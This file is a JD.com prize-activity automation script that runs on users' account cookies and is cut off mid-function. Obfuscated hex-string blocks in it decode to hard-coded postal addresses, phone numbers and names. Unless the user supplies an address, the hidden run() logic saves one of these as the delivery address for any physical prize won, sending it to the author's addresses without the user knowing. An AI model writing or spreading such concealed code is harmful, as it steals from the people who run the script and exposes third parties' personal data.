/*
[task_local]
# 购物车锦鲤_自动抢
0,59 * * * t_cart_koi_detect.js, tag=购物车锦鲤_自动抢, enabled=true
 */
const $ = new Env('购物车锦鲤_自动抢');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
$.ativityUrlPrefix = "https://lzkjdz-isv.isvjcloud.com/wxCartKoi/cartkoi/activity?activityId="
$.activityIds = process.env.T_CART_KOI_ACTIVITY_IDS ? process.env.T_CART_KOI_ACTIVITY_IDS : "";
$.activityId = ""
$.activityUrl = ""
$.Token = "";
$.openCard = false
$.friendUuid = ""
$.canRunUrl = []
$.LZ_AES_PIN = ""
$.index = 1
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
let lz_jdpin_token_cookie = ''
let activityCookie = ''

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe80b4=["\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\x69\x6E\x70\x75\x74\x41\x64\x64\x72\x65\x73\x73","\x49\x4E\x50\x55\x54\x5F\x41\x44\x44\x52\x45\x53\x53","\x65\x6E\x76","","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5E02\u5357\u533A\x2C\u9999\u6E2F\u897F\u8DEF\x36\x37\u53F7\u5149\u5927\u56FD\u9645\u91D1\u878D\u4E2D\u5FC3\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x37\x31\x2C\x33\x37\x30\x32\x30\x32\x2C\x20\u7530\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x31\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x34\x31\x2C\x33\x37\x30\x32\x31\x33\x2C\x20\u7530\u8C46\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5D02\u5C71\u533A\x2C\u6CC9\u5CAD\u8DEF\x38\u53F7\u4E2D\u5546\u56FD\u9645\u5927\u53A6\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x32\x2C\x20\u5DE9\u5927\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u89E3\u653E\u8DEF\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u7530\u751C\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u946B\u65FA\u8DEF\u5609\u5FB7\u57CE\u5E02\u82B1\u56ED\x2C\x31\x35\x31\x36\x33\x32\x34\x32\x35\x35\x32\uFF0C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u5F20\u8C46","\x3B","\x73\x70\x6C\x69\x74","\x70\x75\x73\x68","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];$[__Oxe80b4[0x0]]= [];$[__Oxe80b4[0x1]]= process[__Oxe80b4[0x3]][__Oxe80b4[0x2]]?process[__Oxe80b4[0x3]][__Oxe80b4[0x2]]:__Oxe80b4[0x4];if($[__Oxe80b4[0x1]]== __Oxe80b4[0x4]){$[__Oxe80b4[0x0]]= [__Oxe80b4[0x5],__Oxe80b4[0x6],__Oxe80b4[0x7],__Oxe80b4[0x8],__Oxe80b4[0x9]]}else {temp= $[__Oxe80b4[0x1]][__Oxe80b4[0xb]](__Oxe80b4[0xa]);for(let address of temp){$[__Oxe80b4[0x0]][__Oxe80b4[0xc]](address)}};;;(function(_0x646bx2,_0x646bx3,_0x646bx4,_0x646bx5,_0x646bx6,_0x646bx7){_0x646bx7= __Oxe80b4[0xd];_0x646bx5= function(_0x646bx8){if( typeof alert!== _0x646bx7){alert(_0x646bx8)};if( typeof console!== _0x646bx7){console[__Oxe80b4[0xe]](_0x646bx8)}};_0x646bx4= function(_0x646bx9,_0x646bx2){return _0x646bx9+ _0x646bx2};_0x646bx6= _0x646bx4(__Oxe80b4[0xf],_0x646bx4(_0x646bx4(__Oxe80b4[0x10],__Oxe80b4[0x11]),__Oxe80b4[0x12]));try{_0x646bx2= __encode;if(!( typeof _0x646bx2!== _0x646bx7&& _0x646bx2=== _0x646bx4(__Oxe80b4[0x13],__Oxe80b4[0x14]))){_0x646bx5(_0x646bx6)}}catch(e){_0x646bx5(_0x646bx6)}})({})
const redis = require('redis');
$.redisStatus = process.env.USE_REDIS ? process.env.USE_REDIS : false;
$.signUrl = process.env.JD_SIGN_URL ? process.env.JD_SIGN_URL : '';
if ($.signUrl == '') {
    console.log(`请自行搭建sign接口，并设置环境变量-->\n  export JD_SIGN_URL="你的接口地址"`)
    return
}
let TokenKey = "TOKEN_KEY:"
redisClient = null
if ($.redisStatus) {
    redisClient = redis.createClient({
        url: 'redis://127.0.0.1:6379'
    });
} else {
    console.log(`禁用Redis缓存Token，开启请设置环境变量-->\n  export USE_REDIS=true `)
}

if ($.isNode()) {
    Object.keys(jdCookieNode).forEach((item) => {
        cookiesArr.push(jdCookieNode[item])
    })
    if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
    };
} else {
    cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
!(async () => {

    if ($.redisStatus) {
        redisClient.on('ready', () => {
            console.log('redis已准备就绪')
        })

        redisClient.on('error', err => {
            console.log("redis异常：" + err)

        })
        await redisClient.connect()
        console.log('redis连接成功')
    }

    console.log('入口下拉：https://prodev.m.jd.com/mall/active/3z1Vesrhx3GCCcBn2HgbFR4Jq68o/index.html')
    if (!cookiesArr[0]) {
        $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
        return;
    }
    let curtimestamp = Date.parse(new Date());
    console.log(curtimestamp)
    for (let activityInfo of $.activityIds.split("&")) {
        $.activityId = activityInfo.split(";")[0]
        let actStartTime = activityInfo.split(";")[1]
        if (actStartTime > curtimestamp) {
            console.log(`活动ID：${$.activityId}未到加购时间！`)
        }
        if ((curtimestamp - actStartTime) / 60 / 1000 > 50) {
            console.log(`活动ID：${$.activityId}已过加购时间！`)
        }
        if (actStartTime <= curtimestamp && (curtimestamp - actStartTime) / 60 / 1000 <= 50) {
            // if (actStartTime <= curtimestamp) {
            $.activityUrl = $.ativityUrlPrefix + $.activityId
            console.log(`跳转链接：${$.activityUrl}`)
            $.message = ""
            $.runNum = cookiesArr.length
            $.runCookie = cookiesArr.splice(0, $.runNum)
            for (let i = 0; i < $.runNum; i++) {
                let ckidx = Math.floor(Math.random() * $.runCookie.length)
                cookie = $.runCookie[ckidx];
                $.runCookie.splice(ckidx, 1)
                $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
                $.key = TokenKey + cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1]
                console.log(`\n******开始【京东账号】${$.nickName || $.UserName}*********\n`);
                await jdmodule(true);
                $.index++
                console.log(`休息一下别被403了`)
                await $.wait(parseInt(Math.random() * 5000 + 1000, 10))

            }
            if ($.isNode) {
                if ($.message != '') {
                    await notify.sendNotify("购物车锦鲤开奖结果", `${$.activityName}\n${$.message}\n跳转链接：${$.activityUrl}`)
                }
            }
        }
    }
})()
    .catch((e) => {
        $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
        $.done();
        if ($.redisStatus) {
            redisClient.quit()
            console.log('redis关闭成功')
        }
    })

function showMsg() {
    return new Promise(resolve => {
        $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
        resolve()
    })
}


async function jdmodule(retry) {
    $.domain = $.activityUrl.match(/https?:\/\/([^/]+)/) && $.activityUrl.match(
        /https?:\/\/([^/]+)/)[1] || ''
    $.UA = `jdapp;iPhone;10.2.2;13.1.2;${uuid()};M/5.0;network/wifi;ADID/;model/iPhone8,1;addressid/2308460611;appBuild/167863;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1;`

    await getCK();
    // console.log("lzToken=" + activityCookie)
    // console.log('Token:' + $.Token)
    // if ($.Token == '') {
    //     console.log(`获取Token失败`);
    //     $.needRetry = true
    //     return
    // }
    if ($.redisStatus) {
        $.Token = await redisClient.get($.key)
        if ($.Token == '' || $.Token == null) {
            console.log(`未找到缓存的Token，调用Sign接口`)
            await getSign($.domain)
            await takePostRequest("isvObfuscator");
            console.log('Token-->:' + $.Token)
        } else {
            console.log('缓存Token-->:' + $.Token)
        }
    } else {
        await getSign($.domain)
        await takePostRequest("isvObfuscator");
        console.log('Token-->:' + $.Token)
    }

    await takePostRequest("getSimpleActInfoVo");

    await takePostRequest("getMyPing");

    await takePostRequest("accessLogWithAD")

    await takePostRequest("getUserInfo")

    await takePostRequest("activityContent")

    if ($.isGameEnd) {
        console.log(`活动已结束`)
        stop = true;
        return;
    }
    // await takePostRequest("info")

    await takePostRequest("getActMemberInfo");

    if (retry) {
        await run();
    }
}

//运行
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d5b=["\x2D\x2D\x2D\u67E5\u770B\u4E2D\u5956\u7ED3\u679C\x2D\x2D\x2D","\x6C\x6F\x67","\x64\x72\x61\x77\x52\x65\x73\x75\x6C\x74","\x70\x72\x69\x7A\x65\x49\x6E\x66\x6F","","\x6E\x65\x65\x64\x57\x72\x69\x74\x65\x41\x64\x64\x72\x65\x73\x73","\x6E","\x79","\x64\x72\x61\x77\x49\x6E\x66\x6F","\x73\x68\x69\x77\x75\x4E\x61\x6D\x65","\x6E\x61\x6D\x65","\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x61\x64\x64\x72\x65\x73\x73\x49\x64","\u4EAC\u8C46","\x69\x6E\x64\x65\x78\x4F\x66","\u79EF\u5206","\u4F18\u60E0\u5238","\x66\x75\x6C\x6C\x41\x64\x64\x72\x65\x73\x73","\x6C\x65\x6E\x67\x74\x68","\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\u90AE\u5BC4\u5730\u5740\uFF1A","\x2C","\x73\x70\x6C\x69\x74","\x70\x72\x6F\x76\x69\x6E\x63\x65","\x63\x69\x74\x79","\x63\x6F\x75\x6E\x74\x79","\x61\x64\x64\x72\x65\x73\x73","\x70\x68\x6F\x6E\x65","\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65","\x61\x72\x65\x61\x43\x6F\x64\x65","\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];async function run(){try{console[__Oxe7d5b[0x1]](__Oxe7d5b[0x0]); await takePostRequest(__Oxe7d5b[0x2]);if($[__Oxe7d5b[0x3]]!= __Oxe7d5b[0x4]){needWriteAddress= $[__Oxe7d5b[0x3]][__Oxe7d5b[0x5]]|| __Oxe7d5b[0x6];if(needWriteAddress== __Oxe7d5b[0x7]){drawInfo= $[__Oxe7d5b[0x3]][__Oxe7d5b[0x8]];$[__Oxe7d5b[0x9]]= drawInfo[__Oxe7d5b[0xa]];$[__Oxe7d5b[0xb]]= $[__Oxe7d5b[0x3]][__Oxe7d5b[0xc]]|| __Oxe7d5b[0x4];if($[__Oxe7d5b[0x9]][__Oxe7d5b[0xe]](__Oxe7d5b[0xd])==  -1&& $[__Oxe7d5b[0x9]][__Oxe7d5b[0xe]](__Oxe7d5b[0xf])==  -1&& $[__Oxe7d5b[0x9]][__Oxe7d5b[0xe]](__Oxe7d5b[0x10])==  -1){$[__Oxe7d5b[0x11]]= $[__Oxe7d5b[0x13]][cookiesArr[__Oxe7d5b[0x12]]% $[__Oxe7d5b[0x13]][__Oxe7d5b[0x12]]];console[__Oxe7d5b[0x1]](__Oxe7d5b[0x14]+ $[__Oxe7d5b[0x11]]);let _0x8cbdx2=$[__Oxe7d5b[0x11]][__Oxe7d5b[0x16]](__Oxe7d5b[0x15]);$[__Oxe7d5b[0x17]]= _0x8cbdx2[0x0];$[__Oxe7d5b[0x18]]= _0x8cbdx2[0x1];$[__Oxe7d5b[0x19]]= _0x8cbdx2[0x2];$[__Oxe7d5b[0x1a]]= _0x8cbdx2[0x3];$[__Oxe7d5b[0x1b]]= _0x8cbdx2[0x4];$[__Oxe7d5b[0x1c]]= _0x8cbdx2[0x5];$[__Oxe7d5b[0x1d]]= _0x8cbdx2[0x6];$[__Oxe7d5b[0x1e]]= _0x8cbdx2[0x7];if($[__Oxe7d5b[0xb]]== __Oxe7d5b[0x4]){ await takePostRequest(`${__Oxe7d5b[0x1f]}`)}else { await takePostRequest(`${__Oxe7d5b[0x20]}`)}}}}}catch(e){console[__Oxe7d5b[0x1]](e)}}(function(_0x8cbdx3,_0x8cbdx4,_0x8cbdx5,_0x8cbdx6,_0x8cbdx7,_0x8cbdx8){_0x8cbdx8= __Oxe7d5b[0x21];_0x8cbdx6= function(_0x8cbdx9){if( typeof alert!== _0x8cbdx8){alert(_0x8cbdx9)};if( typeof console!== _0x8cbdx8){console[__Oxe7d5b[0x1]](_0x8cbdx9)}};_0x8cbdx5= function(_0x8cbdxa,_0x8cbdx3){return _0x8cbdxa+ _0x8cbdx3};_0x8cbdx7= _0x8cbdx5(__Oxe7d5b[0x22],_0x8cbdx5(_0x8cbdx5(__Oxe7d5b[0x23],__Oxe7d5b[0x24]),__Oxe7d5b[0x25]));try{_0x8cbdx3= __encode;if(!( typeof _0x8cbdx3!== _0x8cbdx8&& _0x8cbdx3=== _0x8cbdx5(__Oxe7d5b[0x26],__Oxe7d5b[0x27]))){_0x8cbdx6(_0x8cbdx7)}}catch(e){_0x8cbdx6(_0x8cbdx7)}})({})

function getSign(domain) {
    let myRequest = getSignRequest(domain);
    // console.log(type + '-->'+ JSON.stringify(myRequest))
    return new Promise(async resolve => {
        $.post(myRequest, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${$.toStr(err, err)}`)
                    console.log(`sign API请求失败，请检查网路重试`)
                } else {
                    dataObj = JSON.parse(data)
                    $.sign = dataObj.data.convertUrlNew
                }
            } catch (e) {
                // console.log(data);
                console.log(e, resp)
            } finally {
                resolve();
            }
        })
    })
}

function getSignRequest(domain, method = "POST") {
    let headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie,
        "User-Agent": $.UA,
        "X-Requested-With": "XMLHttpRequest"
    }
    prefixUrl = "https://" + domain
    bodyInner = `{"url":"${prefixUrl}", "id":""}`
    let body = `body=${encodeURIComponent(bodyInner)}&functionId=isvObfuscator`
    // console.log(headers)
    // console.log(headers.Cookie)
    let url = $.signUrl
    return { url: url, method: method, headers: headers, body: body, timeout: 30000 };
}

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d5d=["\x6F\x75\x74\x46\x6C\x61\x67","\x64\x6F\x6D\x61\x69\x6E","","\x50\x4F\x53\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x63\x6C\x69\x65\x6E\x74\x2E\x61\x63\x74\x69\x6F\x6E\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x69\x73\x76\x4F\x62\x66\x75\x73\x63\x61\x74\x6F\x72","\x73\x69\x67\x6E","\x69\x73\x76\x4F\x62\x66\x75\x73\x63\x61\x74\x6F\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x2F\x63\x75\x73\x74\x6F\x6D\x65\x72\x2F\x67\x65\x74\x53\x69\x6D\x70\x6C\x65\x41\x63\x74\x49\x6E\x66\x6F\x56\x6F","\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64","\x67\x65\x74\x53\x69\x6D\x70\x6C\x65\x41\x63\x74\x49\x6E\x66\x6F\x56\x6F","\x2F\x63\x75\x73\x74\x6F\x6D\x65\x72\x2F\x67\x65\x74\x4D\x79\x50\x69\x6E\x67","\x75\x73\x65\x72\x49\x64\x3D","\x76\x65\x6E\x64\x65\x72\x49\x64","\x26\x74\x6F\x6B\x65\x6E\x3D","\x54\x6F\x6B\x65\x6E","\x26\x66\x72\x6F\x6D\x54\x79\x70\x65\x3D\x41\x50\x50","\x67\x65\x74\x4D\x79\x50\x69\x6E\x67","\x2F\x63\x6F\x6D\x6D\x6F\x6E\x2F\x61\x63\x63\x65\x73\x73\x4C\x6F\x67\x57\x69\x74\x68\x41\x44","\x2F\x64\x72\x61\x77\x43\x65\x6E\x74\x65\x72\x2F\x61\x63\x74\x69\x76\x69\x74\x79\x3F\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x26\x66\x72\x69\x65\x6E\x64\x55\x75\x69\x64\x3D","\x66\x72\x69\x65\x6E\x64\x55\x75\x69\x64","\x76\x65\x6E\x64\x65\x72\x49\x64\x3D","\x26\x63\x6F\x64\x65\x3D\x32\x30\x30\x34\x26\x70\x69\x6E\x3D","\x26\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x26\x70\x61\x67\x65\x55\x72\x6C\x3D","\x26\x73\x75\x62\x54\x79\x70\x65\x3D\x61\x70\x70\x26\x61\x64\x53\x6F\x75\x72\x63\x65\x3D","\x61\x63\x63\x65\x73\x73\x4C\x6F\x67\x57\x69\x74\x68\x41\x44","\x2F\x77\x78\x41\x63\x74\x69\x6F\x6E\x43\x6F\x6D\x6D\x6F\x6E\x2F\x67\x65\x74\x55\x73\x65\x72\x49\x6E\x66\x6F","\x70\x69\x6E\x3D","\x67\x65\x74\x55\x73\x65\x72\x49\x6E\x66\x6F","\x2F\x77\x78\x43\x61\x72\x74\x4B\x6F\x69\x2F\x2F\x63\x61\x72\x74\x6B\x6F\x69\x2F\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x26\x70\x69\x6E\x3D","\x26\x70\x69\x6E\x49\x6D\x67\x3D","\x61\x74\x74\x72\x54\x6F\x75\x58\x69\x61\x6E\x67","\x26\x73\x74\x61\x74\x75\x73\x3D\x31\x26\x66\x72\x69\x65\x6E\x64\x55\x75\x69\x64\x3D","\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x2F\x64\x72\x61\x77\x43\x65\x6E\x74\x65\x72\x2F\x67\x65\x74\x50\x72\x6F\x64\x75\x63\x74","\x26\x74\x79\x70\x65\x3D","\x74\x79\x70\x65","\x74\x61\x73\x6B","\x67\x65\x74\x50\x72\x6F\x64\x75\x63\x74","\x2F\x77\x78\x43\x6F\x6D\x6D\x6F\x6E\x49\x6E\x66\x6F\x2F\x67\x65\x74\x41\x63\x74\x4D\x65\x6D\x62\x65\x72\x49\x6E\x66\x6F","\x26\x76\x65\x6E\x64\x65\x72\x49\x64\x3D","\x67\x65\x74\x41\x63\x74\x4D\x65\x6D\x62\x65\x72\x49\x6E\x66\x6F","\x2F\x63\x6F\x6D\x6D\x6F\x6E\x2F\x67\x65\x74\x53\x79\x73\x74\x69\x6D\x65","\x63\x75\x72\x72\x65\x6E\x74\x54\x69\x6D\x65","\x2F\x6A\x6F\x69\x6E\x74\x2F\x6F\x72\x64\x65\x72\x2F\x64\x72\x61\x77","\x26\x61\x63\x74\x6F\x72\x55\x75\x69\x64\x3D","\x61\x63\x74\x6F\x72\x55\x75\x69\x64","\x26\x64\x72\x61\x77\x54\x79\x70\x65\x3D\x31","\x73\x74\x61\x72\x74\x44\x72\x61\x77","\x2F\x77\x78\x41\x63\x74\x69\x6F\x6E\x43\x6F\x6D\x6D\x6F\x6E\x2F\x66\x6F\x6C\x6C\x6F\x77\x53\x68\x6F\x70","\x26\x62\x75\x79\x65\x72\x4E\x69\x63\x6B\x3D","\x26\x75\x73\x65\x72\x49\x64\x3D","\x26\x61\x63\x74\x69\x76\x69\x74\x79\x54\x79\x70\x65\x3D","\x61\x63\x74\x69\x76\x69\x74\x79\x54\x79\x70\x65","\x66\x6F\x6C\x6C\x6F\x77\x53\x68\x6F\x70","\x2F\x77\x78\x43\x61\x72\x74\x4B\x6F\x69\x2F\x63\x61\x72\x74\x6B\x6F\x69\x2F\x71\x75\x69\x63\x6B\x41\x64\x64\x43\x61\x72\x74","\x26\x70\x72\x6F\x64\x75\x63\x74\x49\x64\x73\x3D","\x70\x72\x6F\x64\x75\x63\x74\x49\x64\x73","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x71\x75\x69\x63\x6B\x41\x64\x64\x53\x6B\x75","\x2F\x64\x69\x6E\x67\x7A\x68\x69\x2F\x6F\x70\x65\x6E\x63\x61\x72\x64\x2F","\x62\x72\x6F\x77\x73\x65\x47\x6F\x6F\x64\x73","\x26\x76\x61\x6C\x75\x65\x3D","\x76\x69\x73\x69\x74\x53\x6B\x75\x56\x61\x6C\x75\x65","\x2F\x77\x78\x43\x61\x72\x74\x4B\x6F\x69\x2F\x63\x61\x72\x74\x6B\x6F\x69\x2F\x64\x72\x61\x77\x52\x65\x73\x75\x6C\x74","\x26\x75\x75\x69\x64\x3D","\x75\x75\x69\x64","\x64\x72\x61\x77\x52\x65\x73\x75\x6C\x74","\x2F\x77\x78\x41\x64\x64\x72\x65\x73\x73\x2F\x73\x61\x76\x65","\x26\x61\x63\x74\x54\x79\x70\x65\x3D","\x26\x70\x72\x69\x7A\x65\x4E\x61\x6D\x65\x3D","\x73\x68\x69\x77\x75\x4E\x61\x6D\x65","\x26\x72\x65\x63\x65\x69\x76\x65\x72\x3D","\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65","\x26\x70\x68\x6F\x6E\x65\x3D","\x70\x68\x6F\x6E\x65","\x26\x70\x72\x6F\x76\x69\x6E\x63\x65\x3D","\x70\x72\x6F\x76\x69\x6E\x63\x65","\x26\x63\x69\x74\x79\x3D","\x63\x69\x74\x79","\x26\x61\x64\x64\x72\x65\x73\x73\x3D","\x61\x64\x64\x72\x65\x73\x73","\x26\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64\x3D\x26\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65\x3D","\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65","\x26\x70\x65\x72\x73\x6F\x6E\x61\x6C\x45\x6D\x61\x69\x6C\x3D\x26\x61\x72\x65\x61\x43\x6F\x64\x65\x3D","\x61\x72\x65\x61\x43\x6F\x64\x65","\x26\x63\x6F\x75\x6E\x74\x79\x3D","\x63\x6F\x75\x6E\x74\x79","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73","\x26\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64\x3D","\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x26\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65\x3D","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\u9519\u8BEF","\x6C\x6F\x67","\x73\x74\x61\x74\x75\x73\x43\x6F\x64\x65","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u6B64\x69\x70\u5DF2\u88AB\u9650\u5236\uFF0C\u8BF7\u8FC7\x31\x30\u5206\u949F\u540E\u518D\u6267\u884C\u811A\u672C\x0A","\x74\x6F\x53\x74\x72","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\x70\x6F\x73\x74","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];async function takePostRequest(_0x2b98x2){if($[__Oxe7d5d[0x0]]){return};let _0x2b98x3=$[__Oxe7d5d[0x1]];let _0x2b98x4=`${__Oxe7d5d[0x2]}`;let _0x2b98x5=__Oxe7d5d[0x3];let _0x2b98x6=__Oxe7d5d[0x2];switch(_0x2b98x2){case __Oxe7d5d[0x6]:url= `${__Oxe7d5d[0x4]}`;_0x2b98x4= $[__Oxe7d5d[0x5]];break;case __Oxe7d5d[0xb]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x8]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x12]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0xc]}`;_0x2b98x4= `${__Oxe7d5d[0xd]}${$[__Oxe7d5d[0xe]]}${__Oxe7d5d[0xf]}${$[__Oxe7d5d[0x10]]}${__Oxe7d5d[0x11]}`;break;case __Oxe7d5d[0x1c]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x13]}`;let _0x2b98x7=`${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x14]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x15]}${$[__Oxe7d5d[0x16]]}${__Oxe7d5d[0x2]}`;_0x2b98x4= `${__Oxe7d5d[0x17]}${$[__Oxe7d5d[0xe]]}${__Oxe7d5d[0x18]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x19]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x1a]}${encodeURIComponent(_0x2b98x7)}${__Oxe7d5d[0x1b]}`;break;case __Oxe7d5d[0x1f]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x1d]}`;_0x2b98x4= `${__Oxe7d5d[0x1e]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x25]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x20]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x22]}${encodeURIComponent($[__Oxe7d5d[0x23]])}${__Oxe7d5d[0x24]}${$[__Oxe7d5d[0x16]]}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x2a]:url= 